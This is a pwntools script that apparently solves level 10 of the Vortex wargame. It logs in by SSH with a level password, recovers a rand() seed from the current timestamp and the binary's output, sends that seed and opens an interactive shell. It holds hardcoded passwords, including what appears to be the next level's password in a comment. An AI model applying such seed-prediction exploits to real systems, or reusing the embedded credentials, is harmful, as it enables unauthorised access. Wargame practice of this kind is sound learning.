from pwn import *
from random import randint
from time import sleep
import time


local_dir = None
remote_binary = None
local_binary = None
local_libc = None
libc = None
port = None
elf = None

BINARY_PATH = None
CWD = None
VM = None

def pad(s, slen):
    return s+b"B"*(slen-len(s))

def connect(level, password,init=True):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    global CWD
    global BINARY_PATH
    global VM
    compose_downloaded_files(level)
    port = 2228
    connected = False
    s = None
    while not connected:
        try:
            s = ssh("vortex"+level, "176.9.9.172", password=password, cache=True, port=port)
            connected = True
            log.info("connected")
            if init:
                s.libs(remote_binary, local_dir)
        except Exception as e:
            log.info("ssh connection attempt failed")
            print("error: {0}".format(e))
            sleep(randint(1, 5))
    log.info(f"cloned_binary: {local_binary}")
    elf = ELF(local_binary)
    libc = ELF(local_libc)
    context.clear()
    context.binary = local_binary
    context.log_file = "/tmp/docgillog"
    VM = False
    CWD = "/tmp/"
    BINARY_PATH = "/vortex/vortex"+level
    return s


def pad(s, slen):
    return s+b"B"*(slen-len(s))


# function of local testing vm
def connect_to_vm(level, password, remote=True):
    global CWD
    global VM
    global BINARY_PATH
    if remote:
        connect(level, password)
    else:
        compose_downloaded_files(level)
    context.clear()
    context.binary = local_binary
    context.log_file = "/tmp/docgillog"
    s = ssh("gil", "192.168.2.177", password="gil123", cache=True)
    CWD = "/vortex/6/"
    BINARY_PATH = "/vortex/vortex" + level
    # BINARY_PATH = "/vortex/6/dir/vortex6"
    # BINARY_PATH = "dir/vortex6"
    s.upload(local_binary, BINARY_PATH)
    s.process(["chmod", "a+x", BINARY_PATH])
    VM = True
    return s
    # only useful to replace libc, if we need gadgets from it, then upload and use LD_PRELOAD
    # s.upload(local_libc, "/lib/x86_64-linux-gnu/libc.so.6")


def compose_downloaded_files(level):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    global local_libc
    local_dir = "/home/kali/PycharmProjects/vortex/" + level
    remote_binary = "/vortex/vortex" + level
    local_binary = local_dir + remote_binary
    local_libc = local_dir + "/lib32/libc.so.6"


s = connect("10", "5WT0}swdc")
# s = connect_to_vm("10", "5WT0}swdc", remote=False)

while True:
    io = s.process([BINARY_PATH])
    # timestamp = int(process(["./10/time"]).recvall().decode("utf-8"), 10)
    timestamp = int(time.time())
    log.info(f"timestamp: {timestamp}")


    data = io.recvuntil(b"]").decode("utf-8")
    log.info(f"data: {data}")

    values = list()
    data = data[1:].replace("[", "").replace(",]", "")
    log.info(f"data: {data}")
    values = data.split(",")
    cleaned_values = list()

    for v in values:
        cleaned_values.append(v.strip())

    match = cleaned_values[0]
    match = int(match, 16)
    match = str(match)
    result_seed = None

    rand_io = process(["./10/rand", match, str(timestamp)])
    log.info(rand_io.recvline())
    log.info(rand_io.recvline())
    result_seed = rand_io.recvall().replace(b"found seed:", b"").replace(b"\n", b"")
    log.info(f"result_seed: {result_seed}")
    # result_seed.decode("utf-8")
    if b"did not find match" in result_seed:
        log.warn("DID NOT FIND MATCH")
        continue
    log.warn("FOUND MATCH")
    assert len(result_seed) == 4
    io.send(result_seed)
    io.interactive()
    break

# %8sLEszy9






